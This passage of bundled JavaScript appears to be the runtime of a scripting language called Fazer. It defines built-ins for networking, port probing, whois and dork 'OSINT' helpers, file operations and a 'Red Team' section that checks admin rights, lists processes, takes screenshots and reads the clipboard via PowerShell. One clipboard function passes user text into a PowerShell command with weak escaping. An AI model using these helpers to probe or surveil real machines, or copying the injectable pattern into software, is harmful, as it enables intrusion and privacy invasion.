                  res.end("Internal Server Error: " + e.message);
                }
              });
            });
            srv.listen(Number(port), () => {
              resolve(true);
            });
            srv.on("error", () => resolve(false));
          });
        },
        download: async (url, path2) => {
          checkPerm("net");
          checkPerm("fs");
          const fs2 = require("fs");
          const https3 = require("https");
          return new Promise((resolve) => {
            const file = fs2.createWriteStream(path2);
            https3.get(url, function(response) {
              response.pipe(file);
              file.on("finish", function() {
                file.close(() => resolve(true));
              });
            }).on("error", () => {
              fs2.unlink(path2, () => resolve(false));
            });
          });
        },
        // Socket Connect / Port Scan
        connect: async (host, port, timeout = 2e3) => {
          checkPerm("net");
          return new Promise((resolve) => {
            const socket = new (require("net")).Socket();
            socket.setTimeout(Number(timeout));
            socket.on("connect", () => {
              socket.destroy();
              resolve(true);
            });
            socket.on("timeout", () => {
              socket.destroy();
              resolve(false);
            });
            socket.on("error", (e) => {
              socket.destroy();
              resolve(false);
            });
            socket.connect(Number(port), String(host));
          });
        },
        // TCP Client
        tcp_client: async (host, port, onData) => {
          checkPerm("net");
          const net = require("net");
          const client = new net.Socket();
          const id = "tcp_" + Date.now() + "_" + Math.random();
          return new Promise((resolve) => {
            client.connect(Number(port), String(host), () => {
              const api = {
                id,
                write: (data) => client.write(String(data)),
                close: () => client.destroy()
              };
              client.on("data", async (data) => {
                if (onData && onData.__fnref__) {
                  await this._call(onData, [data.toString(), api], this.global);
                }
              });
              client.on("close", () => {
              });
              resolve(api);
            });
            client.on("error", () => resolve(null));
          });
        },
        // UDP Client/Server (Simple)
        udp_socket: async (port, onMsg) => {
          checkPerm("net");
          const dgram = require("dgram");
          const server = dgram.createSocket("udp4");
          return new Promise((resolve) => {
            server.on("error", (err) => {
              server.close();
              resolve(null);
            });
            server.on("message", async (msg, rinfo) => {
              if (onMsg && onMsg.__fnref__) {
                const info = { address: rinfo.address, port: rinfo.port, size: rinfo.size };
                await this._call(onMsg, [msg.toString(), info], this.global);
              }
            });
            server.on("listening", () => {
              const address = server.address();
              const api = {
                send: (msg, host, port2) => {
                  server.send(String(msg), Number(port2), String(host));
                },
                close: () => server.close()
              };
              resolve(api);
            });
            if (port) server.bind(Number(port));
            else {
              const api = {
                send: (msg, host, port2) => {
                  server.send(String(msg), Number(port2), String(host));
                },
                close: () => server.close()
              };
              resolve(api);
            }
          });
        },
        // WebSocket Client
        websocket: (url) => {
          checkPerm("net");
          let WS;
          try {
            WS = require_ws();
          } catch (e) {
            WS = global.WebSocket;
          }
          if (!WS) throw new FazerError("WebSocket requires 'ws' npm package");
          return new Promise((resolve) => {
            try {
              const ws = new WS(String(url));
              const api = {
                send: (msg) => ws.send(String(msg)),
                close: () => ws.close(),
                on: (ev, fn) => {
                  if (ws.on) {
                    ws.on(ev, async (data) => {
                      if (fn && fn.__fnref__) await this._call(fn, [data ? String(data) : null], this.global);
                    });
                  } else {
                    ws["on" + ev] = async (e) => {
                      const d = e.data || e;
                      if (fn && fn.__fnref__) await this._call(fn, [d ? String(d) : null], this.global);
                    };
                  }
                }
              };
              if (ws.on) ws.on("open", () => resolve(api));
              else ws.onopen = () => resolve(api);
              if (ws.on) ws.on("error", () => resolve(null));
              else ws.onerror = () => resolve(null);
            } catch (e) {
              resolve(null);
            }
          });
        },
        // Get Public IP (External)
        public_ip: async () => {
          checkPerm("net");
          try {
            const res = await builtins.fetch("https://api.ipify.org");
            return res.body;
          } catch (e) {
            return "0.0.0.0";
          }
        },
        // DNS Lookup
        dns: async (domain) => {
          checkPerm("net");
          const dns = require("dns").promises;
          try {
            return await dns.resolve(String(domain));
          } catch (e) {
            return [];
          }
        },
        // Network Interfaces
        interfaces: () => {
          checkPerm("net");
          return require("os").networkInterfaces();
        }
      },
      // [OSINT] Open Source Intelligence Tools
      osint: {
        // Whois Query
        whois: async (domain) => {
          checkPerm("osint");
          return new Promise((resolve) => {
            const client = require("net").createConnection(43, "whois.iana.org", () => {
              client.write(domain + "\r\n");
            });
            let data = "";
            client.on("data", (chunk) => data += chunk);
            client.on("end", () => resolve(data));
            client.on("error", (err) => resolve("Error: " + err.message));
          });
        },
        // Google Dorking Helper (Generates URL)
        dork_url: (query) => {
          return "https://www.google.com/search?q=" + encodeURIComponent(String(query));
        },
        // User Agent Generator
        ua: () => {
          const agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
          ];
          return agents[Math.floor(Math.random() * agents.length)];
        }
      },
      // [TUI] Terminal User Interface (ANSI)
      tui: {
        clear: () => {
          process.stdout.write("\x1B[2J\x1B[H");
        },
        pos: (x, y) => {
          process.stdout.write(`\x1B[${Number(y)};${Number(x)}H`);
        },
        color: (fg, bg) => {
          let c = "";
          if (fg) c += `\x1B[${fg}m`;
          if (bg) c += `\x1B[${bg}m`;
          process.stdout.write(c);
        },
        reset: () => {
          process.stdout.write("\x1B[0m");
        },
        box: (x, y, w, h, title) => {
          const xn = Number(x);
          const yn = Number(y);
          const wn = Number(w);
          const hn = Number(h);
          process.stdout.write(`\x1B[${yn};${xn}H\u250C${"\u2500".repeat(wn - 2)}\u2510`);
          if (title) {
            const t = String(title).substring(0, wn - 4);
            process.stdout.write(`\x1B[${yn};${xn + 2}H ${t} `);
          }
          for (let i = 1; i < hn - 1; i++) {
            process.stdout.write(`\x1B[${yn + i};${xn}H\u2502${" ".repeat(wn - 2)}\u2502`);
          }
          process.stdout.write(`\x1B[${yn + hn - 1};${xn}H\u2514${"\u2500".repeat(wn - 2)}\u2518`);
        },
        progress: (x, y, w, percent) => {
          const xn = Number(x);
          const yn = Number(y);
          const wn = Number(w);
          const p = Math.max(0, Math.min(100, Number(percent)));
          const filled = Math.floor((wn - 2) * (p / 100));
          process.stdout.write(`\x1B[${yn};${xn}H[${"=".repeat(filled)}${" ".repeat(wn - 2 - filled)}] ${Math.floor(p)}%`);
        }
      },
      fs: {
        read: (path2) => {
          checkPerm("fs");
          try {
            return require("fs").readFileSync(String(path2), "utf8");
          } catch (e) {
            return null;
          }
        },
        write: (path2, data) => {
          checkPerm("fs");
          try {
            require("fs").writeFileSync(String(path2), String(data));
            return true;
          } catch (e) {
            return false;
          }
        },
        append: (path2, data) => {
          checkPerm("fs");
          try {
            require("fs").appendFileSync(String(path2), String(data));
            return true;
          } catch (e) {
            return false;
          }
        },
        exists: (path2) => {
          checkPerm("fs");
          return require("fs").existsSync(String(path2));
        },
        mkdir: (path2) => {
          checkPerm("fs");
          try {
            require("fs").mkdirSync(String(path2), { recursive: true });
            return true;
          } catch (e) {
            return false;
          }
        },
        // Enhanced FS
        read_bytes: (path2) => {
          checkPerm("fs");
          try {
            return require("fs").readFileSync(String(path2));
          } catch (e) {
            return null;
          }
        },
        write_bytes: (path2, data) => {
          checkPerm("fs");
          try {
            if (Array.isArray(data)) data = Buffer.from(data);
            require("fs").writeFileSync(String(path2), data);
            return true;
          } catch (e) {
            return false;
          }
        },
        list: (path2) => {
          checkPerm("fs");
          try {
            return require("fs").readdirSync(String(path2));
          } catch (e) {
            return [];
          }
        },
        list_recursive: (dir) => {
          checkPerm("fs");
          const fs2 = require("fs");
          const path2 = require("path");
          let results = [];
          try {
            const list = fs2.readdirSync(dir);
            list.forEach((file) => {
              file = path2.join(dir, file);
              const stat = fs2.statSync(file);
              if (stat && stat.isDirectory()) {
                results = results.concat(builtins.fs.list_recursive(file));
              } else {
                results.push(file);
              }
            });
          } catch (e) {
          }
          return results;
        },
        copy: (src, dest) => {
          checkPerm("fs");
          try {
            require("fs").copyFileSync(String(src), String(dest));
            return true;
          } catch (e) {
            return false;
          }
        },
        move: (src, dest) => {
          checkPerm("fs");
          try {
            require("fs").renameSync(String(src), String(dest));
            return true;
          } catch (e) {
            return false;
          }
        },
        delete: (path2) => {
          checkPerm("fs");
          try {
            require("fs").rmSync(String(path2), { recursive: true, force: true });
            return true;
          } catch (e) {
            return false;
          }
        },
        stats: (path2) => {
          checkPerm("fs");
          try {
            const s = require("fs").statSync(String(path2));
            return { size: s.size, is_dir: s.isDirectory(), mtime: s.mtimeMs, ctime: s.ctimeMs };
          } catch (e) {
            return null;
          }
        }
      },
      // ──────────────────────────────────────────────────────────────────────────
      // [DB] Lightweight JSON Database
      // ──────────────────────────────────────────────────────────────────────────
      db: {
        _data: {},
        _path: null,
        open: (path2) => {
          builtins.db._path = String(path2);
          try {
            const fs2 = require("fs");
            if (fs2.existsSync(builtins.db._path)) {
              builtins.db._data = JSON.parse(fs2.readFileSync(builtins.db._path, "utf8"));
            } else {
              builtins.db._data = {};
            }
            return true;
          } catch (e) {
            return false;
          }
        },
        save: () => {
          if (!builtins.db._path) return false;
          try {
            require("fs").writeFileSync(builtins.db._path, JSON.stringify(builtins.db._data, null, 2));
            return true;
          } catch (e) {
            return false;
          }
        },
        set: (key, value) => {
          builtins.db._data[String(key)] = value;
          return true;
        },
        get: (key) => {
          return builtins.db._data[String(key)];
        },
        delete: (key) => {
          delete builtins.db._data[String(key)];
          return true;
        },
        keys: () => Object.keys(builtins.db._data),
        // Collection helper (Array of Objects)
        push: (key, item) => {
          if (!Array.isArray(builtins.db._data[key])) builtins.db._data[key] = [];
          builtins.db._data[key].push(item);
        },
        find: (key, queryFn) => {
          return builtins.db._data[key] || [];
        }
      },
      // ──────────────────────────────────────────────────────────────────────────
      // [SCHED] Task Scheduler
      // ──────────────────────────────────────────────────────────────────────────
      sched: {
        _tasks: {},
        after: async (ms, fn) => {
          const id = "t_" + Date.now() + "_" + Math.random();
          const timer2 = setTimeout(async () => {
            try {
              await this._call(fn, [], this.global);
            } catch (e) {
              console.error("Sched Error:", e);
            }
            delete builtins.sched._tasks[id];
          }, Number(ms));
          builtins.sched._tasks[id] = timer2;
          return id;
        },
        every: async (ms, fn) => {
          const id = "i_" + Date.now() + "_" + Math.random();
          const timer2 = setInterval(async () => {
            try {
              await this._call(fn, [], this.global);
            } catch (e) {
              console.error("Sched Error:", e);
            }
          }, Number(ms));
          builtins.sched._tasks[id] = timer2;
          return id;
        },
        cancel: (id) => {
          const t = builtins.sched._tasks[id];
          if (t) {
            clearTimeout(t);
            clearInterval(t);
            delete builtins.sched._tasks[id];
            return true;
          }
          return false;
        },
        // Cron-like Scheduler
        cron: (expr, fn) => {
          const id = "c_" + Date.now() + "_" + Math.random();
          const parseField = (f, min, max) => {
            if (f === "*") return true;
            const v = Number(f);
            return !isNaN(v) && v >= min && v <= max ? v : null;
          };
          const check = () => {
            const now = /* @__PURE__ */ new Date();
            const [min, hour, dom, mon, dow] = expr.split(" ");
            const m = parseField(min, 0, 59);
            const h = parseField(hour, 0, 23);
            const d = parseField(dom, 1, 31);
            const mo = parseField(mon, 1, 12);
            const dw = parseField(dow, 0, 6);
            if ((m === true || m === now.getMinutes()) && (h === true || h === now.getHours()) && (d === true || d === now.getDate()) && (mo === true || mo === now.getMonth() + 1) && (dw === true || dw === now.getDay())) {
              this._call(fn, [], this.global).catch((e) => console.error("Cron Error:", e));
            }
          };
          const timer2 = setInterval(check, 6e4);
          builtins.sched._tasks[id] = timer2;
          return id;
        }
      },
      // ──────────────────────────────────────────────────────────────────────────
      // [CSV] CSV Parser & Generator
      // ──────────────────────────────────────────────────────────────────────────
      csv: {
        parse: (text, delimiter = ",") => {
          const str = String(text);
          const del = String(delimiter);
          const rows = [];
          let row = [];
          let col = "";
          let inQuote = false;
          for (let i = 0; i < str.length; i++) {
            const c = str[i];
            const next = str[i + 1];
            if (inQuote) {
              if (c === '"') {
                if (next === '"') {
                  col += '"';
                  i++;
                } else {
                  inQuote = false;
                }
              } else {
                col += c;
              }
            } else {
              if (c === '"') {
                inQuote = true;
              } else if (c === del) {
                row.push(col);
                col = "";
              } else if (c === "\r") {
              } else if (c === "\n") {
                row.push(col);
                rows.push(row);
                row = [];
                col = "";
              } else {
                col += c;
              }
            }
          }
          if (row.length > 0 || col.length > 0) {
            row.push(col);
            rows.push(row);
          }
          return rows;
        },
        stringify: (rows, delimiter = ",") => {
          if (!Array.isArray(rows)) return "";
          const esc = (v) => {
            const s = String(v ?? "");
            if (s.includes(delimiter) || s.includes('"') || s.includes("\n")) {
              return '"' + s.replace(/"/g, '""') + '"';
            }
            return s;
          };
          return rows.map((r) => r.map(esc).join(delimiter)).join("\n");
        }
      },
      // ──────────────────────────────────────────────────────────────────────────
      // [COMPRESSION] Zlib Wrapper
      // ──────────────────────────────────────────────────────────────────────────
      compression: {
        gzip: (data) => {
          try {
            return require("zlib").gzipSync(Buffer.from(String(data))).toString("base64");
          } catch (e) {
            return null;
          }
        },
        gunzip: (b642) => {
          try {
            return require("zlib").gunzipSync(Buffer.from(String(b642), "base64")).toString();
          } catch (e) {
            return null;
          }
        },
        deflate: (data) => {
          try {
            return require("zlib").deflateSync(Buffer.from(String(data))).toString("base64");
          } catch (e) {
            return null;
          }
        },
        inflate: (b642) => {
          try {
            return require("zlib").inflateSync(Buffer.from(String(b642), "base64")).toString();
          } catch (e) {
            return null;
          }
        }
      },
      // WebAssembly Support
      wasm: {
        load: async (p, imports = {}) => {
          checkPerm("fs");
          try {
            const buf = fs.readFileSync(path.resolve(String(p)));
            const mod = await WebAssembly.instantiate(buf, imports);
            return {
              instance: mod.instance,
              module: mod.module,
              exports: mod.instance.exports
            };
          } catch (e) {
            throw new FazerError("WASM Load Error: " + e.message);
          }
        },
        validate: (bytes) => {
          if (Array.isArray(bytes)) bytes = Buffer.from(bytes);
          return WebAssembly.validate(bytes);
        }
      },
      // [WEBVIEW] Modern HTML/CSS UI
      webview: {
        _clients: /* @__PURE__ */ new Set(),
        send: (type, data) => {
          const msg = JSON.stringify({ type, data });
          builtins.webview._clients.forEach((c) => c.res.write(`data: ${msg}

`));
        },
        start: async (config, callback) => {
          const http3 = require("http");
          const fs2 = require("fs");
          const path2 = require("path");
          const root2 = path2.resolve(String(config.root || "."));
          const port = Number(config.port) || 0;
          if (process.env.FAZER_PREVIEW) {
            config.open = false;
          }
          return new Promise((resolve) => {
            const server = http3.createServer((req, res) => {
              if (req.url === "/favicon.ico") {
                res.writeHead(204);
                res.end();
                return;
              }
              if (config.html && req.url === "/") {
                res.writeHead(200, { "Content-Type": "text/html" });
                res.end(config.html, "utf-8");
                return;
              }
              let filePath2 = path2.join(root2, req.url === "/" ? "index.html" : req.url);
              if (!filePath2.startsWith(root2)) {
                res.writeHead(403);
                res.end("Forbidden");
                return;
              }
              const ext = path2.extname(filePath2);
              const mime = {
                ".html": "text/html",
                ".js": "text/javascript",
                ".css": "text/css",
                ".json": "application/json",
                ".png": "image/png",
                ".jpg": "image/jpeg",
                ".svg": "image/svg+xml",
                ".ico": "image/x-icon",
                ".ttf": "font/ttf",
                ".woff": "font/woff",
                ".woff2": "font/woff2"
              }[ext] || "text/plain";
              fs2.readFile(filePath2, (err, content) => {
                if (err) {
                  if (err.code === "ENOENT") {
                    res.writeHead(404);
                    res.end("Not Found");
                  } else {
                    res.writeHead(500);
                    res.end("Error: " + err.code);
                  }
                } else {
                  res.writeHead(200, { "Content-Type": mime });
                  res.end(content, "utf-8");
                }
              });
            });
            const oldHandler = server.listeners("request")[0];
            server.removeAllListeners("request");
            server.on("request", (req, res) => {
              if (req.url === "/_fazer/events") {
                res.writeHead(200, {
                  "Content-Type": "text/event-stream",
                  "Cache-Control": "no-cache",
                  "Connection": "keep-alive",
                  "Access-Control-Allow-Origin": "*"
                });
                const client = { res };
                builtins.webview._clients.add(client);
                req.on("close", () => builtins.webview._clients.delete(client));
                return;
              }
              if (req.url === "/_fazer/send" && req.method === "POST") {
                let body = "";
                req.on("data", (c) => body += c);
                req.on("end", async () => {
                  try {
                    const msg = JSON.parse(body);
                    if (callback && callback.__fnref__) {
                      await this._call(callback, [msg], this.global);
                    }
                    if (msg.type === "input" && builtins.gfx) {
                      builtins.gfx._inputs = msg.inputs;
                    }
                    res.writeHead(200);
                    res.end("OK");
                  } catch (e) {
                    res.writeHead(400);
                    res.end("Bad Request");
                  }
                });
                return;
              }
              oldHandler(req, res);
            });
            server.listen(port, () => {
              const url = `http://127.0.0.1:${server.address().port}`;
              console.log(`[WebView] Server running at ${url}`);
              if (config.open !== false) {
                require("child_process").exec(`start ${url}`);
              }
              resolve(true);
            });
          });
        }
      },
      ascii_art: (text, fontName) => {
        const t = String(text).toUpperCase();
        let fKey = String(fontName || "standard");
        const map2 = {
          "Big Money-ne": "big_money_ne",
          "miniwi": "miniwi",
          "Slant": "slant",
          "Terrace": "terrace",
          "ANSI Compact": "ansi_compact",
          "ANSI Regular": "ansi_regular",
          "ANSI Shadow": "ansi_shadow",
          "Bloody": "bloody",
          "Classy": "classy",
          "Delta Corps Priest 1": "delta",
          "Elite": "elite",
          "block": "block",
          "standard": "standard"
        };
        if (map2[fKey]) fKey = map2[fKey];
        const font = ASCII_FONTS[fKey] || ASCII_FONTS["standard"];
        const space = font[" "] || font["A"];
        const height = space ? space.length : 5;
        let output = "";
        for (let row = 0; row < height; row++) {
          let line = "";
          for (const char of t) {
            const charData = font[char] || font[" "];
            if (charData && charData[row]) {
              line += charData[row] + " ";
            }
          }
          output += line + "\n";
        }
        return output;
      },
      println: (x = "") => {
        if (typeof x === "object" && x !== null) console.log(JSON.stringify(x, null, 2));
        else console.log(String(x));
        return null;
      },
      print: (x = "") => (process.stdout.write(String(x)), null),
      ask: async (prompt = "") => {
        process.stdout.write(String(prompt));
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        return new Promise((resolve) => {
          process.stdin.once("data", (chunk) => {
            process.stdin.pause();
            resolve(chunk.toString().replace(/[\r\n]+$/, ""));
          });
        });
      },
      readln: (prompt = "") => builtins.ask(prompt),
      // Terminal / UI Advanced
      term_clear: () => (process.stdout.write("\x1B[2J\x1B[H"), null),
      term_pos: (r, c) => (process.stdout.write(`\x1B[${r};${c}H`), null),
      term_up: (n) => (process.stdout.write(`\x1B[${n}A`), null),
      term_down: (n) => (process.stdout.write(`\x1B[${n}B`), null),
      term_left: (n) => (process.stdout.write(`\x1B[${n}D`), null),
      term_right: (n) => (process.stdout.write(`\x1B[${n}C`), null),
      term_hide: () => (process.stdout.write("\x1B[?25l"), null),
      term_show: () => (process.stdout.write("\x1B[?25h"), null),
      term_size: () => ({ rows: process.stdout.rows, cols: process.stdout.columns }),
      term_raw: (enable) => {
        enableRawInput(enable);
        return null;
      },
      term_read: () => {
        return stdinBuffer.length > 0 ? stdinBuffer.shift() : null;
      },
      sleep: async (ms) => {
        await new Promise((r) => setTimeout(r, Number(ms)));
        return null;
      },
      // Advanced Colors & FX
      rgb: (r, g, b, text) => `\x1B[38;2;${Number(r)};${Number(g)};${Number(b)}m${String(text)}\x1B[0m`,
      bg_rgb: (r, g, b, text) => `\x1B[48;2;${Number(r)};${Number(g)};${Number(b)}m${String(text)}\x1B[0m`,
      gradient: (text, r1, g1, b1, r2, g2, b2) => makeGradient(String(text), [Number(r1), Number(g1), Number(b1)], [Number(r2), Number(g2), Number(b2)]),
      // Cursor & Title
      cursor_save: () => (process.stdout.write("\x1B[s"), null),
      cursor_restore: () => (process.stdout.write("\x1B[u"), null),
      cursor_hide: () => (process.stdout.write("\x1B[?25l"), null),
      cursor_show: () => (process.stdout.write("\x1B[?25h"), null),
      term_title: (t) => (process.stdout.write(`\x1B]0;${String(t)}\x07`), null),
      // UI Components
      ui_bar: (val, max, width, char) => {
        const v = Number(val);
        const m = Number(max);
        const w = Number(width || 20);
        const c = String(char || "\u2588");
        const filled = Math.round(v / m * w);
        return c.repeat(filled) + " ".repeat(w - filled);
      },
      style: (s, color) => style(s, String(color || "reset")),
      box: (title, ...lines) => box(title, lines),
      readText: (p) => {
        checkPerm("fs");
        return readText(p);
      },
      writeText: (p, s) => {
        checkPerm("fs");
        return writeText(p, s);
      },
      saveText: (s, p) => {
        checkPerm("fs");
        fs.writeFileSync(path.resolve(String(p)), String(s), "utf8");
        return null;
      },
      exists: (p) => {
        checkPerm("fs");
        return fs.existsSync(path.resolve(String(p)));
      },
      // Core Utils (Standard Library)
      fs_read: (p) => {
        checkPerm("fs");
        try {
          return fs.readFileSync(path.resolve(String(p)), "utf8");
        } catch (e) {
          return null;
        }
      },
      fs_write: (p, c) => {
        checkPerm("fs");
        try {
          fs.writeFileSync(path.resolve(String(p)), String(c));
          return true;
        } catch (e) {
          return false;
        }
      },
      fs_exists: (p) => {
        checkPerm("fs");
        return fs.existsSync(path.resolve(String(p)));
      },
      // Module System
      import: async (p) => {
        checkPerm("fs");
        const pAbs = path.resolve(String(p));
        if (!fs.existsSync(pAbs)) return null;
        const code2 = fs.readFileSync(pAbs, "utf8");
        const lex = lexer.tokenize(code2);
        if (lex.errors.length) throw new FazerError("Import Lexer Error: " + lex.errors[0].message);
        const parser = new FazerParser();
        parser.input = lex.tokens;
        const ast2 = parser.program();
        if (parser.errors.length) throw new FazerError("Import Parser Error: " + parser.errors[0].message);
        const rt2 = new _FazerRuntime({ filename: pAbs, code: code2 });
        await rt2.run(ast2);
        const exports2 = {};
        console.log("Exporting vars from module...");
        for (const [k, v] of rt2.global.vars) {
          console.log("Exporting:", k, v);
          if (k === "__builtins__" || builtins[k]) continue;
          let value = v.value;
          if (value && typeof value === "object" && value.__fnref__) {
            const fnName = value.__fnref__;
            const fnDef = rt2.fns.get(fnName);
            if (fnDef) {
              const uniqueName = `__import_${Math.floor(Math.random() * 1e6)}_${fnName}`;
              this.fns.set(uniqueName, fnDef);
              value = { __fnref__: uniqueName };
            } else {
              console.log("Warning: Function definition not found for", fnName);
            }
          }
          exports2[k] = value;
        }
        return exports2;
      },
      // Persistence (Simple JSON DB)
      db_load: (p) => {
        checkPerm("fs");
        try {
          return JSON.parse(fs.readFileSync(path.resolve(String(p)), "utf8"));
        } catch (e) {
          return {};
        }
      },
      db_save: (p, data) => {
        checkPerm("fs");
        try {
          fs.writeFileSync(path.resolve(String(p)), JSON.stringify(data, null, 2));
          return true;
        } catch (e) {
          return false;
        }
      },
      // System Automation
      clipboard_set: (text) => {
        checkPerm("exec");
        if (process.platform === "win32") {
          try {
            const script = `Set-Clipboard -Value '${String(text).replace(/'/g, "''")}'`;
            const b642 = Buffer.from(script, "utf16le").toString("base64");
            child_process2.execSync(`powershell -EncodedCommand ${b642}`);
            return true;
          } catch (e) {
            return false;
          }
        }
        return false;
      },
      clipboard_get: () => {
        checkPerm("exec");
        if (process.platform === "win32") {
          try {
            return child_process2.execSync(`powershell -command "Get-Clipboard"`).toString().trim();
          } catch (e) {
            return "";
          }
        }
        return "";
      },
      notify: (title, msg) => {
        checkPerm("exec");
        if (process.platform === "win32") {
          const cmd2 = `
              [reflection.assembly]::loadwithpartialname("System.Windows.Forms");
              [reflection.assembly]::loadwithpartialname("System.Drawing");
              $n = new-object system.windows.forms.notifyicon;
              $n.icon = [system.drawing.systemicons]::information;
              $n.visible = $true;
              $n.showballoontip(10, "${String(title).replace(/"/g, '`"')}", "${String(msg).replace(/"/g, '`"')}", [system.windows.forms.tooltipicon]::none);
              Start-Sleep -s 3;
              $n.Visible = $false;
              `;
          try {
            const b642 = Buffer.from(cmd2, "utf16le").toString("base64");
            child_process2.execSync(`powershell -EncodedCommand ${b642}`);
            return true;
          } catch (e) {
            return false;
          }
        }
        return false;
      },
      json_parse: (s) => {
        try {
          return JSON.parse(String(s));
        } catch (e) {
          return null;
        }
      },
      json_stringify: (x) => JSON.stringify(x, null, 2),
      type_of: (x) => typeof x,
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, a, b) => String(s).split(String(a)).join(String(b)),
      // simple replace all
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      str_sub: (s, start, end) => String(s).substring(Number(start), Number(end)),
      index_of: (s, search) => String(s).indexOf(String(search)),
      contains: (s, search) => String(s).includes(String(search)),
      random: () => Math.random(),
      round: (x) => Math.round(Number(x)),
      floor: (x) => Math.floor(Number(x)),
      ceil: (x) => Math.ceil(Number(x)),
      abs: (x) => Math.abs(Number(x)),
      min: (a, b) => Math.min(Number(a), Number(b)),
      max: (a, b) => Math.max(Number(a), Number(b)),
      pow: (a, b) => Math.pow(Number(a), Number(b)),
      sqrt: (x) => Math.sqrt(Number(x)),
      // String
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, a, b) => String(s).split(String(a)).join(String(b)),
      // simple replace all
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      str_sub: (s, start, end) => String(s).substring(Number(start), Number(end)),
      pad_start: (s, len2, char) => String(s).padStart(Number(len2), String(char || " ")),
      pad_end: (s, len2, char) => String(s).padEnd(Number(len2), String(char || " ")),
      index_of: (s, search) => String(s).indexOf(String(search)),
      contains: (s, search) => String(s).includes(String(search)),
      // File System
      ls: (p) => {
        try {
          return fs.readdirSync(path.resolve(String(p || ".")));
        } catch (e) {
          return [];
        }
      },
      rm: (p) => {
        try {
          fs.rmSync(path.resolve(String(p)), { recursive: true, force: true });
          return true;
        } catch (e) {
          return false;
        }
      },
      mkdir: (p) => {
        try {
          fs.mkdirSync(path.resolve(String(p)), { recursive: true });
          return true;
        } catch (e) {
          return false;
        }
      },
      cp: (src, dest) => {
        try {
          fs.copyFileSync(path.resolve(String(src)), path.resolve(String(dest)));
          return true;
        } catch (e) {
          return false;
        }
      },
      mv: (src, dest) => {
        try {
          fs.renameSync(path.resolve(String(src)), path.resolve(String(dest)));
          return true;
        } catch (e) {
          return false;
        }
      },
      // System
      exit: (code2) => process.exit(Number(code2 || 0)),
      env_set: (k, v) => {
        process.env[String(k)] = String(v);
        return null;
      },
      // System & Red Team (Advanced)
      sys_info: () => {
        try {
          const cmd2 = `Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | ConvertTo-Json`;
          const os2 = JSON.parse(child_process2.execSync(`powershell -NoProfile -Command "${cmd2}"`, { encoding: "utf8" }));
          const user = process.env.USERNAME;
          const domain = process.env.USERDOMAIN;
          const admin = (() => {
            try {
              child_process2.execSync("net session");
              return true;
            } catch (e) {
              return false;
            }
          })();
          return { os: os2.Caption, version: os2.Version, arch: os2.OSArchitecture, user, domain, is_admin: admin };
        } catch (e) {
          return { error: e.message };
        }
      },
      uptime: () => {
        try {
          const up = child_process2.execSync(`powershell -command "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Select-Object -ExpandProperty TotalSeconds"`).toString().trim();
          return Number(up);
        } catch (e) {
          return 0;
        }
      },
      shutdown: (delay = 0) => child_process2.exec(`shutdown /s /t ${Number(delay)}`),
      restart: (delay = 0) => child_process2.exec(`shutdown /r /t ${Number(delay)}`),
      lock_screen: () => child_process2.exec(`rundll32.exe user32.dll,LockWorkStation`),
      // File System Extended
      file_size: (p) => {
        try {
          return fs.statSync(path.resolve(String(p))).size;
        } catch (e) {
          return -1;
        }
      },
      file_exists: (p) => fs.existsSync(path.resolve(String(p))),
      is_dir: (p) => {
        try {
          return fs.statSync(path.resolve(String(p))).isDirectory();
        } catch (e) {
          return false;
        }
      },
      is_file: (p) => {
        try {
          return fs.statSync(path.resolve(String(p))).isFile();
        } catch (e) {
          return false;
        }
      },
      dir_home: () => os.homedir(),
      dir_temp: () => os.tmpdir(),
      // Crypto Extended
      md5: (s) => crypto.createHash("md5").update(String(s)).digest("hex"),
      sha1: (s) => crypto.createHash("sha1").update(String(s)).digest("hex"),
      sha256: (s) => crypto.createHash("sha256").update(String(s)).digest("hex"),
      uuid: () => crypto.randomUUID(),
      process_list: () => {
        try {
          const cmd2 = `Get-Process | Select-Object Id, ProcessName, MainWindowTitle | ConvertTo-Json -Depth 1`;
          const out = child_process2.execSync(`powershell -NoProfile -Command "${cmd2}"`, { encoding: "utf8" });
          return JSON.parse(out);
        } catch (e) {
          return [];
        }
      },
      process_kill: (pid) => {
        try {
          process.kill(Number(pid));
          return true;
        } catch (e) {
          return false;
        }
      },
      screenshot: (pathStr) => {
        try {
          const p = path.resolve(String(pathStr));
          const ps = `
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;
$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
$b = New-Object System.Drawing.Bitmap $s.Width, $s.Height;
$g = [System.Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size);
$b.Save('${p.replace(/'/g, "''")}', [System.Drawing.Imaging.ImageFormat]::Png);
$g.Dispose();
$b.Dispose();
             `;
          child_process2.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      clipboard_get: () => {
        try {
          const ps = `Get-Clipboard`;
          return child_process2.execSync(`powershell -NoProfile -Command "${ps}"`, { encoding: "utf8" }).trim();
        } catch (e) {
          return "";
        }
      },
      clipboard_set: (text) => {
        try {
          const t = String(text).replace(/"/g, '\\"');
          const ps = `Set-Clipboard -Value "${t}"`;
          child_process2.execSync(`powershell -NoProfile -Command "${ps}"`);
          return true;
        } catch (e) {
          return false;
        }
      },
      // Automation (Mouse/Keyboard)
      mouse_move: (x, y) => {
        try {
          const ps = `
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${Number(x)}, ${Number(y)});
             `;
          child_process2.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
          return true;
